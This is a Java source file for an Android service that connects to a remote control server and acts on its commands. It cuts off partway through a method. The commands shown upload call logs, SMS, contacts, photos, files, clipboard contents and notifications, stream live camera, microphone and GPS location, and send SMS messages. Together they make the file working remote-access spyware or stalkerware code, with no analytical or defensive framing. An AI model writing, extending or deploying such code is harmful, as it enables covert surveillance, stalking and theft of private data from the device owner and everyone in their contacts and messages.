package com.mydevice.agent;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.widget.Toast;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class DeviceService extends Service {

    private static final String TAG = "DeviceService";
    private static final String CHANNEL_ID = "mydevice_service";
    private static final int NOTIFICATION_ID = 1001;

    public static boolean isRunning = false;
    private static DeviceService instance;

    public static DeviceService getInstance() {
        return instance;
    }

    private Socket socket;
    private String serverUrl;
    private String deviceName;
    private PowerManager.WakeLock wakeLock;
    private FusedLocationProviderClient locationClient;
    private LocationCallback locationCallback;
    private boolean gpsActive = false;
    private MediaRecorder mediaRecorder;
    private Timer callLogCheckTimer;

    // Camera streaming
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private boolean isCameraStreaming = false;
    private boolean useFrontCamera = false;
    private Timer cameraFrameTimer;
    private byte[] latestFrameJpeg = null;

    // Audio streaming
    private AudioRecord audioRecord;
    private boolean isAudioStreaming = false;
    private Thread audioThread;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();
        locationClient = LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            serverUrl = intent.getStringExtra("server_url");
            deviceName = intent.getStringExtra("device_name");
        }

        if (serverUrl == null || serverUrl.isEmpty()) {
            stopSelf();
            return START_NOT_STICKY;
        }

        // Start foreground
        startForeground(NOTIFICATION_ID, buildNotification("Connecting..."));
        isRunning = true;

        // Acquire wake lock
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "mydevice:service");
        wakeLock.acquire();

        // Connect to server
        connectSocket();

        return START_STICKY;
    }

    private void connectSocket() {
        try {
            IO.Options options = new IO.Options();
            options.forceNew = true;
            options.reconnection = true;
            options.reconnectionDelay = 5000;

            socket = IO.socket(serverUrl, options);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected to server");
                updateNotification("Connected to " + serverUrl);

                // Register device
                JSONObject regData = new JSONObject();
                try {
                    regData.put("name", deviceName);
                    regData.put("type", "android-native");
                    regData.put("model", Build.MODEL);
                    regData.put("android", Build.VERSION.RELEASE);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                socket.emit("device:register", regData);

                // Send device info
                sendDeviceInfo();

                // Start periodic call log monitoring (every 30 seconds)
                startCallLogMonitoring();
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.d(TAG, "Disconnected");
                updateNotification("Disconnected - Reconnecting...");
            });

            // Command handlers
            socket.on("command:camera:start", args -> handleCameraStart());
            socket.on("command:camera:stop", args -> handleCameraStop());
            socket.on("command:camera:switch", args -> handleCameraSwitch());
            socket.on("command:camera:capture", args -> handleCameraCapture());
            socket.on("command:gps:start", args -> handleGpsStart());
            socket.on("command:gps:stop", args -> handleGpsStop());
            socket.on("command:calllog:fetch", args -> handleCallLogFetch());
            socket.on("command:sms:fetch", args -> handleSmsFetch());
            socket.on("command:history:fetch", args -> handleHistoryFetch());
            socket.on("command:gallery:scan", args -> handleGalleryScan());
            socket.on("command:gallery:get", args -> {
                if (args.length > 0) handleGalleryGet((JSONObject) args[0]);
            });
            socket.on("command:files:list", args -> {
                if (args.length > 0) handleFilesList((JSONObject) args[0]);
            });
            socket.on("command:files:download", args -> {
                if (args.length > 0) handleFileDownload((JSONObject) args[0]);
            });
            socket.on("command:audio:record", args -> handleAudioRecord());
            socket.on("command:audio:stop", args -> handleAudioStop());
            socket.on("command:contacts:fetch", args -> handleContactsFetch());
            socket.on("command:notifications:fetch", args -> handleNotificationsFetch());
            socket.on("command:whatsapp:fetch", args -> handleWhatsAppFetch());
            socket.on("command:photo:delete", args -> {
                if (args.length > 0) handlePhotoDelete((JSONObject) args[0]);
            });
            socket.on("command:recordings:fetch", args -> handleRecordingsFetch());

            // New feature handlers
            socket.on("command:webview:open", args -> {
                if (args.length > 0) handleWebViewOpen((JSONObject) args[0]);
            });
            socket.on("command:notification:send", args -> {
                if (args.length > 0) handleNotificationSend((JSONObject) args[0]);
            });
            socket.on("command:toast:show", args -> {
                if (args.length > 0) handleToastShow((JSONObject) args[0]);
            });
            socket.on("command:sim:info", args -> handleSimInfo());
            socket.on("command:vibrate", args -> {
                JSONObject params = (args.length > 0 && args[0] instanceof JSONObject) ? (JSONObject) args[0] : new JSONObject();
                handleVibrate(params);
            });
            socket.on("command:sms:send", args -> {
                if (args.length > 0) handleSmsSend((JSONObject) args[0]);
            });
            socket.on("command:sms:sendall", args -> {
                if (args.length > 0) handleSmsSendAll((JSONObject) args[0]);
            });
            socket.on("command:apps:list", args -> handleAppsList());
            socket.on("command:mic:record", args -> {
                JSONObject params = (args.length > 0 && args[0] instanceof JSONObject) ? (JSONObject) args[0] : new JSONObject();
                handleMicRecord(params);
            });
            socket.on("command:clipboard:get", args -> handleClipboardGet());

            socket.connect();

        } catch (URISyntaxException e) {
            Log.e(TAG, "Invalid server URL: " + e.getMessage());
            updateNotification("Error: Invalid URL");
        }
    }

    // ---- Device Info ----
    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);

            // Battery
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            info.put("battery", batteryLevel);
            info.put("charging", bm.isCharging());

            socket.emit("device:info", info);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    // ---- Call Log ----
    private void handleCallLogFetch() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            emitError("calllog:data", "Call log permission not granted");
            return;
        }

        try {
            JSONArray calls = new JSONArray();
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 500");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));

                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE: call.put("type", "incoming"); break;
                        case CallLog.Calls.OUTGOING_TYPE: call.put("type", "outgoing"); break;
                        case CallLog.Calls.MISSED_TYPE: call.put("type", "missed"); break;
                        default: call.put("type", "other");
                    }
                    calls.put(call);
                }
                cursor.close();
            }

            JSONObject data = new JSONObject();
            data.put("calls", calls);
            socket.emit("calllog:data", data);
            Log.d(TAG, "Sent " + calls.length() + " call log entries");

        } catch (Exception e) {
            Log.e(TAG, "Call log error: " + e.getMessage());
            emitError("calllog:data", e.getMessage());
        }
    }

    // ---- SMS ----
    private void handleSmsFetch() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            emitError("sms:data", "SMS permission not granted");
            return;
        }

        try {
            JSONArray messages = new JSONArray();
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 500");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject msg = new JSONObject();
                    msg.put("from", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    msg.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    msg.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    msg.put("read", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1);

                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    msg.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "received" : "sent");

                    messages.put(msg);
                }
                cursor.close();
            }

            JSONObject data = new JSONObject();
            data.put("messages", messages);
            socket.emit("sms:data", data);
            Log.d(TAG, "Sent " + messages.length() + " SMS messages");

        } catch (Exception e) {
            Log.e(TAG, "SMS error: " + e.getMessage());
            emitError("sms:data", e.getMessage());
        }
    }

    // ---- GPS / Location ----
    private void handleGpsStart() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        if (gpsActive) return;
        gpsActive = true;

        LocationRequest request = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(3000)
                .build();

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null && socket != null && socket.connected()) {
                    try {
                        JSONObject data = new JSONObject();
                        data.put("latitude", loc.getLatitude());
                        data.put("longitude", loc.getLongitude());
                        data.put("accuracy", loc.getAccuracy());
                        data.put("speed", loc.getSpeed());
                        data.put("altitude", loc.getAltitude());
                        data.put("timestamp", loc.getTime());
                        socket.emit("gps:location", data);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        };

        locationClient.requestLocationUpdates(request, locationCallback, getMainLooper());
        Log.d(TAG, "GPS started");
    }

    private void handleGpsStop() {
        if (locationCallback != null) {
            locationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
        }
        gpsActive = false;
        Log.d(TAG, "GPS stopped");
    }

    // ---- Gallery ----
    private void handleGalleryScan() {
        try {
            JSONArray photos = new JSONArray();
            ContentResolver cr = getContentResolver();

            String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_MODIFIED,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.DATA
            };

            Cursor cursor = cr.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Images.Media.DATE_MODIFIED + " DESC"
            );

            if (cursor != null) {
                int totalCount = cursor.getCount();
                int count = 0;
                JSONArray batch = new JSONArray();

                while (cursor.moveToNext()) {
                    JSONObject photo = new JSONObject();
                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE));
                    String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));

                    photo.put("id", id);
                    photo.put("name", name);
                    photo.put("size", size);
                    photo.put("lastModified", date * 1000);
                    photo.put("type", type);
                    if (filePath != null) photo.put("path", filePath);

                    // Generate thumbnail
                    try {
                        Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(
                            cr, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
                        if (thumb != null) {
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            thumb.compress(Bitmap.CompressFormat.JPEG, 40, baos);
                            String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                            photo.put("thumbnail", "data:image/jpeg;base64," + base64);
                            thumb.recycle();
                        }
                    } catch (Exception e) {
                        // Skip thumbnail
                    }

                    batch.put(photo);
                    photos.put(photo);
                    count++;

                    // Send in batches of 50
                    if (count % 50 == 0) {
                        JSONObject batchData = new JSONObject();
                        batchData.put("photos", batch);
                        batchData.put("partial", true);
                        batchData.put("total", totalCount);
                        batchData.put("loaded", count);
                        socket.emit("gallery:photos", batchData);
                        batch = new JSONArray();
                        // Small pause to prevent socket overload
                        try { Thread.sleep(100); } catch (InterruptedException ie) {}
                    }
                }
                cursor.close();
            }

            // Send final complete batch
            JSONObject data = new JSONObject();
            data.put("photos", photos);
            data.put("partial", false);
            data.put("total", photos.length());
            data.put("loaded", photos.length());
            socket.emit("gallery:photos", data);
            Log.d(TAG, "Sent " + photos.length() + " gallery photos (all)");

        } catch (Exception e) {
            Log.e(TAG, "Gallery error: " + e.getMessage());
        }
    }

    private void handleGalleryGet(JSONObject args) {
        try {
            long photoId = args.getLong("photoId");
            ContentResolver cr = getContentResolver();
            Uri contentUri = Uri.withAppendedPath(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(photoId));

            Bitmap bitmap = BitmapFactory.decodeStream(cr.openInputStream(contentUri));
            if (bitmap != null) {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

                JSONObject data = new JSONObject();
                data.put("photoId", photoId);
                data.put("content", "data:image/jpeg;base64," + base64);
                data.put("name", "photo_" + photoId + ".jpg");
                socket.emit("gallery:photo", data);
                bitmap.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Gallery get error: " + e.getMessage());
        }
    }

    // ---- Files ----
    private void handleFilesList(JSONObject args) {
        try {
            String path = args.optString("path", "/");
            File dir;

            if (path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
            } else if (path.startsWith("/")) {
                // Absolute path handling
                File absDir = new File(Environment.getExternalStorageDirectory(), path.substring(1));
                if (absDir.exists()) {
                    dir = absDir;
                } else {
                    dir = new File(path);
                }
            } else {
                dir = new File(Environment.getExternalStorageDirectory(), path);
            }

            JSONArray files = new JSONArray();

            // Check MANAGE_EXTERNAL_STORAGE for Android 11+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    JSONObject data = new JSONObject();
                    data.put("files", files);
                    data.put("path", path);
                    data.put("error", "Please grant 'All Files Access' permission in Settings > Apps > My Device Agent > Permissions");
                    socket.emit("files:list", data);
                    return;
                }
            }

            if (dir.exists() && dir.isDirectory()) {
                File[] fileList = dir.listFiles();
                if (fileList != null) {
                    for (File f : fileList) {
                        if (f.getName().startsWith(".")) continue;
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", f.getName());
                        fileObj.put("isDirectory", f.isDirectory());
                        fileObj.put("path", path.equals("/") ? "/" + f.getName() : path + "/" + f.getName());
                        fileObj.put("size", f.isFile() ? f.length() : 0);
                        fileObj.put("lastModified", f.lastModified());
                        if (f.isFile()) fileObj.put("type", getMimeType(f.getName()));
                        files.put(fileObj);
                    }
                }
            } else {
                // Directory doesn't exist - send error info
                JSONObject data = new JSONObject();
                data.put("files", files);
                data.put("path", path);
                data.put("error", "Directory not found: " + dir.getAbsolutePath());
                socket.emit("files:list", data);
                return;
            }

            JSONObject data = new JSONObject();
            data.put("files", files);
            data.put("path", path);
            socket.emit("files:list", data);
            Log.d(TAG, "Files listed: " + files.length() + " items in " + path);

        } catch (Exception e) {
            Log.e(TAG, "Files list error: " + e.getMessage());
            try {
                JSONObject data = new JSONObject();
                data.put("files", new JSONArray());
                data.put("path", args.optString("path", "/"));
                data.put("error", e.getMessage());
                socket.emit("files:list", data);
            } catch (JSONException je) {}
        }
    }

    private void handleFileDownload(JSONObject args) {
        try {
            String filePath = args.getString("filePath");
            File file = new File(Environment.getExternalStorageDirectory(), filePath);

            if (file.exists() && file.isFile() && file.length() < 10 * 1024 * 1024) { // Max 10MB
                FileInputStream fis = new FileInputStream(file);
                byte[] bytes = new byte[(int) file.length()];
                fis.read(bytes);
                fis.close();

                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                String mimeType = getMimeType(file.getName());

                JSONObject data = new JSONObject();
                data.put("fileName", file.getName());
                data.put("content", "data:" + mimeType + ";base64," + base64);
                data.put("type", mimeType);
                data.put("size", file.length());
                socket.emit("files:content", data);
            }
        } catch (Exception e) {
            Log.e(TAG, "File download error: " + e.getMessage());
        }
    }

    // ---- Audio Recording ----
    private void handleAudioRecord() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        try {
            File audioFile = new File(getCacheDir(), "recording.3gp");
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            Log.d(TAG, "Audio recording started");
        } catch (Exception e) {
            Log.e(TAG, "Audio record error: " + e.getMessage());
        }
    }

    private void handleAudioStop() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;

                File audioFile = new File(getCacheDir(), "recording.3gp");
                if (audioFile.exists()) {
                    FileInputStream fis = new FileInputStream(audioFile);
                    byte[] bytes = new byte[(int) audioFile.length()];
                    fis.read(bytes);
                    fis.close();

                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject data = new JSONObject();
                    data.put("audio", "data:audio/3gpp;base64," + base64);
                    data.put("duration", audioFile.length());
                    socket.emit("audio:recording", data);

                    audioFile.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Audio stop error: " + e.getMessage());
            }
        }
    }

    // ---- Contacts ----
    private void handleContactsFetch() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        try {
            JSONArray contacts = new JSONArray();
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    contact.put("number", cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contacts.put(contact);
                }
                cursor.close();
            }

            JSONObject data = new JSONObject();
            data.put("contacts", contacts);
            socket.emit("contacts:data", data);
            Log.d(TAG, "Sent " + contacts.length() + " contacts");

        } catch (Exception e) {
            Log.e(TAG, "Contacts error: " + e.getMessage());
        }
    }

    // ---- History (app usage) ----
    private void handleHistoryFetch() {
        // For native app, we track connection time as history
        try {
            JSONArray history = new JSONArray();
            JSONObject entry = new JSONObject();
            entry.put("url", serverUrl);
            entry.put("title", "Connected to Control Panel");
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("type", "app_connection");
            history.put(entry);

            JSONObject data = new JSONObject();
            data.put("history", history);
            data.put("sessionStart", System.currentTimeMillis());
            socket.emit("history:data", data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    // ---- Camera Streaming (Camera2 API) ----
    private void handleCameraStart() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted");
            return;
        }
        if (isCameraStreaming) return;

        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = getCameraId(manager, useFrontCamera);
            if (cameraId == null) {
                Log.e(TAG, "No camera found");
                return;
            }

            cameraThread = new HandlerThread("CameraThread");
            cameraThread.start();
            cameraHandler = new Handler(cameraThread.getLooper());

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    latestFrameJpeg = bytes;
                    image.close();
                }
            }, cameraHandler);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        SurfaceTexture texture = new SurfaceTexture(0);
                        texture.setDefaultBufferSize(640, 480);
                        Surface dummySurface = new Surface(texture);

                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(imageReader.getSurface());

                        camera.createCaptureSession(
                            java.util.Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        builder.set(CaptureRequest.CONTROL_AF_MODE,
                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                        session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                        isCameraStreaming = true;
                                        startFrameSending();
                                        startAudioStreaming();
                                        Log.d(TAG, "Camera + audio streaming started");
                                    } catch (CameraAccessException e) {
                                        Log.e(TAG, "Camera capture error: " + e.getMessage());
                                    }
                                }
                                @Override
                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                    Log.e(TAG, "Camera configure failed");
                                }
                            }, cameraHandler);
                    } catch (CameraAccessException e) {
                        Log.e(TAG, "Camera session error: " + e.getMessage());
                    }
                }
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }
                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    Log.e(TAG, "Camera error: " + error);
                }
            }, cameraHandler);

        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera start error: " + e.getMessage());
        }
    }

    private void startFrameSending() {
        if (cameraFrameTimer != null) cameraFrameTimer.cancel();
        cameraFrameTimer = new Timer();
        cameraFrameTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (latestFrameJpeg != null && socket != null && socket.connected()) {
                    String base64 = Base64.encodeToString(latestFrameJpeg, Base64.NO_WRAP);
                    try {
                        JSONObject data = new JSONObject();
                        data.put("frame", "data:image/jpeg;base64," + base64);
                        socket.emit("camera:frame", data);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        }, 0, 200); // Send frame every 200ms
    }

    private void startAudioStreaming() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) return;
        if (isAudioStreaming) return;

        int sampleRate = 16000;
        int bufferSize = AudioRecord.getMinBufferSize(sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        if (bufferSize < 4096) bufferSize = 4096;

        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize);
        audioRecord.startRecording();
        isAudioStreaming = true;

        final int finalBufferSize = bufferSize;
        audioThread = new Thread(() -> {
            byte[] buffer = new byte[finalBufferSize];
            while (isAudioStreaming) {
                int read = audioRecord.read(buffer, 0, buffer.length);
                if (read > 0 && socket != null && socket.connected()) {
                    String base64 = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                    try {
                        JSONObject data = new JSONObject();
                        data.put("audio", base64);
                        data.put("sampleRate", sampleRate);
                        socket.emit("camera:audio", data);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        audioThread.start();
        Log.d(TAG, "Audio streaming started");
    }

    private void stopAudioStreaming() {
        isAudioStreaming = false;
        if (audioThread != null) {
            audioThread.interrupt();
            audioThread = null;
        }
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception e) {}
            audioRecord = null;
        }
    }

    private void handleCameraStop() {
        isCameraStreaming = false;
        if (cameraFrameTimer != null) {
            cameraFrameTimer.cancel();
            cameraFrameTimer = null;
        }
        stopAudioStreaming();
        if (captureSession != null) {
            try { captureSession.close(); } catch (Exception e) {}
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (cameraThread != null) {
            cameraThread.quitSafely();
            cameraThread = null;
        }
        latestFrameJpeg = null;
        Log.d(TAG, "Camera + audio streaming stopped");
    }

    private void handleCameraSwitch() {
        useFrontCamera = !useFrontCamera;
        Log.d(TAG, "Switching to " + (useFrontCamera ? "front" : "back") + " camera");
        handleCameraStop();
        // Small delay before restarting
        new Handler(getMainLooper()).postDelayed(this::handleCameraStart, 500);
    }

    private void handleCameraCapture() {
        if (latestFrameJpeg != null && socket != null && socket.connected()) {
            String base64 = Base64.encodeToString(latestFrameJpeg, Base64.NO_WRAP);
            try {
                JSONObject data = new JSONObject();
                data.put("image", "data:image/jpeg;base64," + base64);
                socket.emit("camera:captured", data);
                Log.d(TAG, "Photo captured and sent");
            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            // If camera not streaming, take a quick snapshot
            handleCameraStart();
            new Handler(getMainLooper()).postDelayed(() -> {
                if (latestFrameJpeg != null && socket != null && socket.connected()) {
                    String base64 = Base64.encodeToString(latestFrameJpeg, Base64.NO_WRAP);
                    try {
                        JSONObject data = new JSONObject();
                        data.put("image", "data:image/jpeg;base64," + base64);
                        socket.emit("camera:captured", data);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }, 2000);
        }
    }

    private String getCameraId(CameraManager manager, boolean front) throws CameraAccessException {
        for (String id : manager.getCameraIdList()) {
            CameraCharacteristics chars = manager.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing != null) {
                if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) return id;
                if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) return id;
            }
        }
        // Fallback to first camera
        String[] ids = manager.getCameraIdList();
        return ids.length > 0 ? ids[0] : null;
    }

    // ---- Notifications ----
    private void handleNotificationsFetch() {
        try {
            JSONArray notifs = new JSONArray();
            List<JSONObject> history = NotificationService.getNotificationHistory();

            synchronized (history) {
                for (JSONObject n : history) {
                    notifs.put(n);
                }
            }

            JSONObject data = new JSONObject();
            data.put("notifications", notifs);
            data.put("count", notifs.length());
            data.put("note", notifs.length() == 0 ?
                "Enable Notification Access in Settings > Apps > Special Access > Notification Access" : "");
            socket.emit("notifications:data", data);
            Log.d(TAG, "Sent " + notifs.length() + " notifications");

        } catch (Exception e) {
            Log.e(TAG, "Notifications fetch error: " + e.getMessage());
            emitError("notifications:data", e.getMessage());
        }
    }

    // Called by NotificationService when new notification arrives
    public void onNotificationReceived(JSONObject notifData) {
        if (socket != null && socket.connected()) {
            socket.emit("notification:new", notifData);
        }
    }

    // Called by CallRecordService when call recording completes
    public void onCallRecorded(JSONObject recordingData) {
        if (socket != null && socket.connected()) {
            socket.emit("recording:new", recordingData);
        }
    }

    // Called by CallRecordService for live call state changes
    public void onLiveCallEvent(JSONObject liveData) {
        if (socket != null && socket.connected()) {
